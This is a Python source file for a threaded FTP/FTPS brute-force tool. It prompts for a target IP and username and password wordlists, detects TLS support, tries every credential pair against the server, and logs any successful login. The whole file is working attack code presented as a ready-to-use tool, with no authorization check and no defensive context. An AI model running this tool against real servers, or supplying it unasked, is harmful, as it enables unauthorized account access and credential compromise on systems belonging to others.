import os
import sys
import threading
from queue import Queue
from datetime import datetime
from ftplib import FTP, FTP_TLS

print_lock = threading.Lock()

# --- Configuration ---
# You can change the default paths and settings here
CONFIG = {
    "userlist": "wordlists/usernames.txt",
    "passlist": "wordlists/passwords.txt",
    "output": "results.log",
    "threads": 10,
    "use_tls": None # Set to True for FTPS, False for FTP, or None to auto-detect
}

# -------------------------------
# Load wordlist (with built-in fallback)
# -------------------------------
def load_wordlist(filepath, default_list):
    if os.path.isfile(filepath):
        with open(filepath, "r") as f:
            return [line.strip() for line in f if line.strip()]
    else:
        print(f"[!] File not found: {filepath}. Using default list.")
        return default_list

# -------------------------------
# Logging utility
# -------------------------------
def log_event(filepath, message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(filepath, "a") as f:
        f.write(f"[{timestamp}] {message}\n")

# -------------------------------
# Detect if FTPS is supported (improved with error print)
# -------------------------------
def detect_ftp_mode(target):
    try:
        ftp = FTP_TLS()
        ftp.connect(target, timeout=10)
        ftp.auth()
        ftp.prot_p()
        ftp.quit()
        return True
    except Exception as e:
        print(f"[!] FTPS detection failed: {e}")
        return False

# -------------------------------
# Thread worker
# -------------------------------
def worker(queue, target, use_tls, log_file, stop_flag):
    while True:
        if stop_flag["found"]:
            break

        try:
            username, password = queue.get_nowait()
        except Exception:
            break

        if stop_flag["found"]:
            queue.task_done()
            break

        try:
            ftp = FTP_TLS() if use_tls else FTP()
            ftp.connect(target, timeout=10)
            if use_tls:
                ftp.auth()
                ftp.prot_p()
            ftp.login(username, password)

            with print_lock:
                print(f"[✔] SUCCESS: {username}:{password}")
                log_event(log_file, f"SUCCESS: {username}:{password}")
            ftp.quit()
            stop_flag["found"] = True
        except Exception as e:
            with print_lock:
                print(f"[-] Failed: {username}:{password}")
        finally:
            queue.task_done()

# -------------------------------
# Main brute-force logic
# -------------------------------
def brute_force_ftp(target, userlist, passlist, output, threads, use_tls):
    if not os.path.isfile(userlist):
        print(f"[!] Username file not found: {userlist}")
        return

    if not os.path.isfile(passlist):
        print(f"[!] Password file not found: {passlist}")
        return

    with open(userlist, "r") as f:
        usernames = [line.strip() for line in f if line.strip()]
    with open(passlist, "r") as f:
        passwords = [line.strip() for line in f if line.strip()]

    if not usernames or not passwords:
        print("[!] Empty username or password list.")
        return

    if use_tls is None:
        use_tls = detect_ftp_mode(target)
        print(f"[~] Auto-detect: FTPS {'enabled' if use_tls else 'not supported'}, proceeding with {'FTPS' if use_tls else 'FTP'}")

    combo_queue = Queue()
    for u in usernames:
        for p in passwords:
            combo_queue.put((u, p))

    print(f"[+] Starting brute-force on {target} using {threads} threads (TLS: {'ON' if use_tls else 'OFF'})")
    log_event(output, f"Brute-force started on {target} (TLS: {'ON' if use_tls else 'OFF'})")

    stop_flag = {"found": False}
    thread_pool = []
    for _ in range(threads):
        t = threading.Thread(target=worker, args=(combo_queue, target, use_tls, output, stop_flag))
        t.daemon = True
        t.start()
        thread_pool.append(t)

    combo_queue.join()

    if not stop_flag["found"]:
        print("[!] Brute-force complete. No valid credentials found.")
        log_event(output, f"No valid credentials found for {target}")

# -------------------------------
# Entry Point
# -------------------------------
def main():
    banner = r"""
  _____ _____ ____  ____  ____  _   _ _____ _____ _____ ___  ____   ____ _____ 
|  ___|_   _|  _ \| __ )|  _ \| | | |_   _| ____|  ___/ _ \|  _ \ / ___| ____|
| |_    | | | |_) |  _ \| |_) | | | | | | |  _| | |_ | | | | |_) | |   |  _|  
|  _|   | | |  __/| |_) |  _ <| |_| | | | | |___|  _|| |_| |  _ <| |___| |___ 
|_|     |_| |_|   |____/|_| \_\\___/  |_| |_____|_|   \___/|_| \_\\____|_____|                                                                     
                      🔐 FTP Brute-Force Tool
"""
    print(banner)
    
    target_ip = input("Enter target FTP server IP: ").strip()
    if not target_ip:
        print("[!] Target IP cannot be empty.")
        return

    userlist_path = input(f"Enter username wordlist path [{CONFIG['userlist']}]: ").strip() or CONFIG['userlist']
    passlist_path = input(f"Enter password wordlist path [{CONFIG['passlist']}]: ").strip() or CONFIG['passlist']

    brute_force_ftp(
        target=target_ip,
        userlist=userlist_path,
        passlist=passlist_path,
        output=CONFIG["output"],
        threads=CONFIG["threads"],
        use_tls=CONFIG["use_tls"]
    )

if __name__ == "__main__":
    main()

